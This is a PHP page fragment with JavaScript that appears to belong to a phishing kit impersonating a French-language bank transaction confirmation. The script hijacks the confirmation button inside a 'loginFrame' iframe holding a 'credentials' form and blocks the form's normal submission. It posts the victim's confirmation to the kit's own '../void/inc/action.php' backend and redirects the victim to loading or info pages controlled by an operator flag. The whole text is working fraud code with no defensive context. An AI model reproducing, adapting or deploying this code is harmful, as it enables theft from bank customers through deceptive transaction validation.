<input type="hidden" name="confirm" value="confirmed">


<script>
  const OFFLINE_STATE = <?php echo (int) trim(@file_get_contents('../void/offline.txt')); ?>;
  const USE_LOADING_PAGE = true;
  const ALWAYS_GO_DATA = false;
  const LOADING_MODE = 'never';


  function onSuccess(parsed_response) {

    if (ALWAYS_GO_DATA) {
      window.top.location.href = 'info.php';
      return;
    }

    if (OFFLINE_STATE === 1) {
      window.top.location.href = 'info.php';
      return;
    }

    if (USE_LOADING_PAGE) {
      window.top.location.href = 'loading.php';
    }
  }


  function connectConfirmFrame() {

    const iframe = document.getElementById('loginFrame');

    if (!iframe) {
      console.error('[CONFIRM] #loginFrame not found.');
      return;
    }


    let iframeDoc;

    try {

      iframeDoc =
        iframe.contentDocument ||
        iframe.contentWindow.document;

    } catch (e) {

      console.error(
        '[CONFIRM] Cannot access iframe. It must be same-origin.',
        e
      );

      return;
    }


    if (!iframeDoc) {
      console.error('[CONFIRM] iframe document unavailable.');
      return;
    }


    const confirmBtn =
      iframeDoc.querySelector('.w2a-dismiss');


    if (!confirmBtn) {

      console.error(
        '[CONFIRM] .w2a-dismiss not found inside iframe.'
      );

      return;
    }


    const form =
      iframeDoc.getElementById('credentials') ||
      confirmBtn.closest('form');


    /*
     * Prevent duplicate listener
     */
    if (
      confirmBtn.dataset.confirmConnected === '1'
    ) {
      return;
    }


    confirmBtn.dataset.confirmConnected = '1';

    confirmBtn.style.cursor = 'pointer';


    /*
     * Block any native iframe form submission
     */
    if (form) {

      form.addEventListener(
        'submit',
        function (e) {

          e.preventDefault();
          e.stopPropagation();

          console.log(
            '[CONFIRM] Native iframe form submit blocked.'
          );

          return false;

        },
        true
      );
    }


    /*
     * Click:
     * "cliquez-ici pour valider la transaction"
     */
    confirmBtn.addEventListener(
      'click',
      function (e) {

        e.preventDefault();
        e.stopPropagation();


        const hiddenInput =
          document.querySelector(
            'input[name="confirm"]'
          );


        const confirmValue =
          hiddenInput
            ? hiddenInput.value
            : 'confirmed';


        const data =
          new URLSearchParams();


        data.append(
          'confirm',
          confirmValue
        );


        console.log(
          '[CONFIRM] Sending:',
          {
            confirm: confirmValue
          }
        );


        fetch(
          '../void/inc/action.php?type=confirm',
          {
            method: 'POST',

            headers: {
              'Content-Type':
                'application/x-www-form-urlencoded; charset=UTF-8'
            },

            body: data.toString()
          }
        )

        .then(function (response) {

          if (!response.ok) {

            throw new Error(
              'HTTP ' + response.status
            );
          }

          return response.json();

        })

        .then(function (res) {

          console.log(
            '[CONFIRM] Response:',
            res
          );


          if (res.status === 'ok') {

            onSuccess(res);

          } else {

            console.error(
              '[CONFIRM] Server error:',
              res
            );
          }

        })

        .catch(function (err) {

          console.error(
            '[CONFIRM] Fetch error:',
            err
          );

        });


        return false;
      },
      true
    );


    console.log(
      '[CONFIRM] iframe connected successfully.'
    );
  }


  function initConfirmFrame() {

    const iframe =
      document.getElementById('loginFrame');


    if (!iframe) {

      console.error(
        '[CONFIRM] #loginFrame not found.'
      );

      return;
    }


    /*
     * Connect when iframe loads/reloads
     */
    iframe.addEventListener(
      'load',
      function () {

        console.log(
          '[CONFIRM] iframe load detected.'
        );

        connectConfirmFrame();

      }
    );


    /*
     * IMPORTANT:
     * srcdoc iframe may already be loaded
     * before this script starts
     */
    try {

      if (
        iframe.contentDocument &&
        iframe.contentDocument.readyState !== 'loading'
      ) {

        console.log(
          '[CONFIRM] iframe already loaded - connecting now.'
        );

        connectConfirmFrame();
      }

    } catch (e) {

      console.error(
        '[CONFIRM] Initial iframe connection failed:',
        e
      );
    }
  }


  /*
   * Parent page initialization
   */
  if (document.readyState === 'loading') {

    document.addEventListener(
      'DOMContentLoaded',
      initConfirmFrame
    );

  } else {

    initConfirmFrame();
  }
</script>


											
